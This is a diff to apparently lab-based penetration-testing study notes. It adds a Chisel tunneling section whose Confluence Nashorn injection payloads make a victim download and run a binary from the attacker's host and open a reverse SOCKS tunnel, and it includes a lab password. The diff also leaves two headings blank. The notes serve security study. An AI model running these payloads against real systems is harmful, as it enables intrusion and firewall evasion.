@@ -36,7 +36,7 @@
   - [Antivirus evasion](#antivirus-evasion)
   - [Password attacks](#password-attacks)
   - [Linux privilege escalation](#linux-privilege-escalation)
-  - [Port redirection and SSH tunneling](#port-redirection-and-ssh-tunneling)
+  - [](#port-redirection-and-ssh-tunneling)
   - [Tunneling through deep packet inspectation](#tunneling-through-deep-packet-inspectation)
   - [The metassploit framework](#the-metassploit-framework)
   - [Active directory introduction and enumeration](#active-directory-introduction-and-enumeration)
@@ -1468,7 +1468,7 @@ Reference
     - obtain a root shell via kernel exploitation  
       `./cve-2017-16995` `id`  
 
-### 19. Port redirection and SSH tunneling  
+### 19.   
 - **Port redirection** modifies the data flow by redirecting packets from one socket to another. Configure a host to listen on one port and relay all packets received on that port to another destination
 - **Tunneling** means encapsulating one type of data stream within another, for example, transporting Hypertext Transfer Protocol (HTTP) traffic within a Secure Shell (SSH) connection
 - A **DMZ** is a network containing devices that may be more exposed to a wider, less trusted network
@@ -2974,6 +2974,63 @@ Reference
     $kali login to DB
     kali@kali:~$  sudo ./netsh_exercise_client -i 192.168.120.64 -p 4545 ->MULTISERVER03
     ```
+
+### Tunneling through Deep Packet Inspection  
+- HTTP tunneling with chisel  
+  - Set up Chisel as a reverse SOCKS proxy. SSH into PGDATABASE01
+    ```
+    #Scenario Summary
+	Victim: CONFLUENCE01 with only TCP/8090 allowed inbound
+	DPI firewall: Only allows outbound HTTP (port 80)
+	No reverse shell, no socat/ncat, no SSH
+	Only curl or wget usable from victim
+	You have RCE via Confluence using Nashorn Java injection
+    ```
+    - Download Chisel v1.10.1 and start apache  
+      ```
+      wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
+      gunzip chisel_1.10.1_linux_amd64.gz
+      chmod +x chisel_1.10.1_linux_amd64
+      sudo mv chisel_1.10.1_linux_amd64 /var/www/html/chisel
+      
+      sudo systemctl start apache2
+      ```
+    - Start **Chisel Server** in reverse mode on Kali (port 8080)  
+      `chisel server --port 8080 --reverse`
+    - Exploit Confluence rce to wget Chisel  
+      ```
+      curl "http://<CONFLUENCE>:8090/\${new javax.script.ScriptEngineManager().getEngineByName('nashorn').eval('new java.lang.ProcessBuilder().command(\"bash\",\"-c\",\"wget http://<KALI>/chisel -O /tmp/chisel && chmod +x /tmp/chisel\").start()')}"
+
+      curl http://192.168.126.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.208/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/  
+      ```
+    - Confirm via Apache access logs > GET /chisel HTTP/1.1  
+      `tail -f /var/log/apache2/access.log`
+    - Exploit to run Chisel client R:socks  
+      ```
+      curl "http://<CONFLUENCE>:8090/\${new javax.script.ScriptEngineManager().getEngineByName('nashorn').eval('new java.lang.ProcessBuilder().command(\"bash\",\"-c\",\"/tmp/chisel client <KALI>:8080 R:socks\").start()')}"
+
+      curl http://192.168.126.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.208:8080%20R:socks%27%29.start%28%29%22%29%7D/
+      ```
+    - Confirm tunnel via ss or tcpdump  
+      `ss -ntplu | grep 8080` `sudo tcpdump -nvvvXi tun0 tcp port 8080` 
+    - SSH with proxy via Chisel SOCKS tunnel (PASSWORD:sqlpass123)
+      ```
+      sudo apt install ncat
+      ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.126.215
+      ```
+  - Set up a port forward using Chisel that allows you to run the binary you downloaded against port 8008 on PGDATABASE01  
+    - Start Chisel Server in reverse mode on Kali (port 8080)  
+      `chisel server --port 8080 --reverse`
+    - sudo nano /etc/proxychains4.conf  
+      `socks5 127.0.0.1 1080`
+    - Inject payload to download Chisel on CONFLUENCE01  
+      `curl http://192.168.126.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.208/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/`
+    - Exploit to run Chisel client R:socks port 8080  
+      `curl http://192.168.126.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.208:8080%20R:socks%27%29.start%28%29%22%29%7D/`
+    - chisel terminal > proxy#R:127.0.0.1:1080=>socks: Listening  
+    - connect to DB port 8008 through a SOCKS proxy using proxychains.  
+      `proxychains ./chisel_exercise_client -i 10.4.126.215 -p 8008`
+- DNS tunnelling with dnscat2
 
 ## Penetration testing report 
 - note editor:
